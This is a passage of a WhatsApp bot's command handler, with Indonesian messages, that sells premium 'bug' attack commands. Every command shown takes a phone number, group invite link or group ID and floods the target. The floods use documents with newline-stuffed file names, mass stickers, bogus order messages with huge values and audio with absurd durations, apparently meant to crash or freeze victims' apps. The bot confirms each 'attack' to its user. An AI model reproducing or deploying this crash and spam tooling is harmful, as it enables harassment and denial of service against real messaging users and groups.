"mediaUrl": "https://lynk.id/tds4youshop", 
"sourceUrl": "https://lynk.id/tds4youshop" }}}, { quoted: m })
}
break
case "shoot": case "bugkuy":  case "duarr":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} nomor|jumlah`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendMessage(prrkek, { document: thumb, caption: "RIDZ STORE Bug🔥`", fileName: `RIDZ STORE Bug🔥 ⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${button}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid" }, { quoted: lep })
Biiofc.sendMessage(prrkek, { document: thumb, caption: "YOUTUBE RIDZ STORE`", fileName: `RIDZ STORE Bug🔥 ⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${button}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid" }, { quoted: lep })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb RaffOffcial`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@RaffOffcial", 
"sourceUrl": "https://youtube.com/@RaffOffcial" }}}, { quoted: m })
}
break
case "killyou": case "doblekill": case "triplekill":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} nomor|jumlah`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendStimg(prrkek, ppuser, lep, { packname: "RIDZ STORE Bug🔥", author: "" })
Biiofc.sendStimg(prrkek, ppuser, lep, { packname: "RIDZ STORE Bug🔥", author: "" })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "RaffOffcial`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://lynk.id/Raffpanel", 
"sourceUrl": "https://lynk.id/Raffpanel" }}}, { quoted: m })
}
break
case "savage": case "santet": case "danger":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} nomor|jumlah`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
const order = generateWAMessageFromContent(prrkek, proto.Message.fromObject({
"orderMessage": {
"orderId": "391028153034238",
"thumbnail": fkethmb,
"itemCount": 9999,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": "https://lynk.id/tds4youshop`",
"message": `${button}`,
"sellerJid": "62895354709030@s.whatsapp.net",
"token": "AR7zJt8MasFx2Uir/fdxhkhPGDbswfWrAr2gmoyqNZ/0Wg==",
"totalAmount1000": "99999",
"totalCurrencyCode": "IDR",
}
}), { userJid: prrkek, quoted: lep })
Biiofc.relayMessage(prrkek, order.message, { messageId: order.key.id})
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "RaffOffcial`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://lynk.id/Raffpanel", 
"sourceUrl": "https://lynk.id/Raffpanel" }}}, { quoted: m })
}
break
case "meninggal": case "headshot": case "mati":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} nomor|jumlah`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendMessage(prrkek, { audio: audionya, mimetype: 'audio/mp4', seconds: 999999999, ptt: false}, { quoted: lep })
Biiofc.sendMessage(prrkek, { audio: audionya, mimetype: 'audio/mp4', seconds: 999999999, ptt: false}, { quoted: lep })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "RaffOffcial`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://lynk.id/tds4youshop", 
"sourceUrl": "https://youtu.be/ZlabLFVCFms" }}}, { quoted: m })
}
break
// LAST DI ATAS
// ATTACK GROUP V1 ( PAKE LINK GROUP )
case "killgc": case "santetgc": case "gcwakwaw": {
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!q) return reply(`Contoh ${prefix+command} linkgc|jumlah`)
if (!isUrl(q.split("|")[0]) && !q.split("|")[0].includes("whatsapp.com")) return reply("Link Invalid!")
let fhehfhe = q.split("|")[0].split("https://chat.whatsapp.com/")[1]
let mnm = await Biiofc.groupAcceptInvite(fhehfhe)
await reply(mess.wait)
global.jumlah = q.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendMessage(mnm, { text: "RIDZ STORE Bug🔥`" }, { quoted: lep })
Biiofc.sendMessage(mnm, { text: "RIDZ STORE Bug🔥`" }, { quoted: lep })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${mnm.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [mnm],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "RaffOffcial`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://lynk.id/tds4youshop", 
"sourceUrl": "https://lynk.id/tds4youshop" }}}, { quoted: m })
}
break
case "togc": case "matigc": case "kuygc": {
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!q) return reply(`Contoh ${prefix+command} linkgc|jumlah`)
if (!isUrl(q.split("|")[0]) && !q.split("|")[0].includes("whatsapp.com")) return reply("Link Invalid!")
let fhehfhe = q.split("|")[0].split("https://chat.whatsapp.com/")[1]
let mnm = await Biiofc.groupAcceptInvite(fhehfhe)
await reply(mess.wait)
global.jumlah = q.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendMessage(mnm, { document: thumb, caption: "YOUTUBE RaffOffcial`", fileName: `RaffOffcial ⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${button}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid" }, { quoted: lep })
Biiofc.sendMessage(mnm, { document: thumb, caption: "YOUTUBE RaffOffcial`", fileName: `RaffOffcial ⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${button}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid" }, { quoted: lep })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${mnm.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 JAM !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [mnm],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "RaffOffcial`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://lynk.id/Raffpanel", 
"sourceUrl": "https://lynk.id/Raffpanel" }}}, { quoted: m })
}
break
case "attackgc": case "mampusgc": case "gasgc": {
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!q) return reply(`Contoh ${prefix+command} linkgc|jumlah`)
if (!isUrl(q.split("|")[0]) && !q.split("|")[0].includes("whatsapp.com")) return reply("Link Invalid!")
let fhehfhe = q.split("|")[0].split("https://chat.whatsapp.com/")[1]
let mnm = await Biiofc.groupAcceptInvite(fhehfhe)
await reply(mess.wait)
global.jumlah = q.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendStimg(prrkek, ppuser, lep, { packname: "BUG BOT", author: "" })
Biiofc.sendStimg(prrkek, ppuser, lep, { packname: "BUG BOT", author: "" })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${mnm.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 JAM !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [mnm],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "RaffOffcial`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://lynk.id/Raffpanel", 
"sourceUrl": "https://lynk.id/Raffpanel" }}}, { quoted: m })
}
break
case "ampasgc": case "bahayagc": case "hatihatigc": {
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!q) return reply(`Contoh ${prefix+command} linkgc|jumlah`)
if (!isUrl(q.split("|")[0]) && !q.split("|")[0].includes("whatsapp.com")) return reply("Link Invalid!")
let fhehfhe = q.split("|")[0].split("https://chat.whatsapp.com/")[1]
let mnm = await Biiofc.groupAcceptInvite(fhehfhe)
await reply(mess.wait)
global.jumlah = q.split("|")[1]
for (let i = 0; i < jumlah; i++) {
const order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "391028153034238",
"thumbnail": fkethmb,
"itemCount": 9999,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": "Youtube bii`",
"message": `${button}`,
"sellerJid": "62895354709030@s.whatsapp.net",
"token": "AR7zJt8MasFx2Uir/fdxhkhPGDbswfWrAr2gmoyqNZ/0Wg==",
"totalAmount1000": "99999",
"totalCurrencyCode": "IDR",
}
}), { userJid: from, quoted: lep })
Biiofc.relayMessage(prrkek, order.message, { messageId: order.key.id})
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${mnm.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 JAM !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [mnm],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "RaffOffcial`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://lynk.id/Raffpanel", 
"sourceUrl": "https://lynk.id/Raffpanel" }}}, { quoted: m })
}
break
case "crashgc": case "stuckgc": case "ganasgc": {
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!q) return reply(`Contoh ${prefix+command} linkgc|jumlah`)
if (!isUrl(q.split("|")[0]) && !q.split("|")[0].includes("whatsapp.com")) return reply("Link Invalid!")
let fhehfhe = q.split("|")[0].split("https://chat.whatsapp.com/")[1]
let mnm = await Biiofc.groupAcceptInvite(fhehfhe)
await reply(mess.wait)
global.jumlah = q.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendMessage(prrkek, { audio: audionya, mimetype: 'audio/mp4', seconds: 999999999, ptt: false}, { quoted: lep })
Biiofc.sendMessage(prrkek, { audio: audionya, mimetype: 'audio/mp4', seconds: 999999999, ptt: false}, { quoted: lep })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${mnm.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [mnm],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "RaffOffcial`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://lynk.id/Raffpanel", 
"sourceUrl": "https://lynk.id/Raffpanel" }}}, { quoted: m })
}
break
// LAST DI ATAS
// ATTACK GROUP V2 ( PAKE ID GROUP )
case "buggc": case "shootgc": case "dorrgc":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} idgroup|jumlah\nUntuk Cek Idgroup Silahkan Ketik .cekidgc`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+"@g.us"
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendMessage(prrkek, { text: "RaffOffcial Bug🔥`" }, { quoted: lep })
Biiofc.sendMessage(prrkek, { text: "YOUTUBE RaffOffcial Bug🔥`" }, { quoted: lep })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "RaffOffcial`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://lynk.id/Raffpanel", 
"sourceUrl": "https://lynk.id/Raffpanel" }}}, { quoted: m })
}
break
case "attackgc": case "meninggalgc": case "matigc":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} idgroup|jumlah\nUntuk Cek Idgroup Silahkan Ketik .cekidgc`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+"@g.us"
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendMessage(prrkek, { document: thumb, caption: "YOUTUBE RaffOffcial Bug🔥`", fileName: `RaffOffcial Bug🔥 ⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${button}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid" }, { quoted: lep })
Biiofc.sendMessage(prrkek, { document: thumb, caption: "YOUTUBE RaffOffcial Bug🔥`", fileName: `RaffOffcial Bug🔥 ⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${button}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid" }, { quoted: lep })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "RaffOffcial Bug🔥`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://lynk.id/Raffpanel", 
"sourceUrl": "https://lynk.id/Raffpanel" }}}, { quoted: m })
}
break
case "seranggc": case "bomgc": case "ledakangc":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} idgroup|jumlah\nUntuk Cek Idgroup Silahkan Ketik .cekidgc`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+"@g.us"
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendStimg(prrkek, ppuser, lep, { packname: "BUG BOT", author: "" })
Biiofc.sendStimg(prrkek, ppuser, lep, { packname: "BUG BOT", author: "" })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
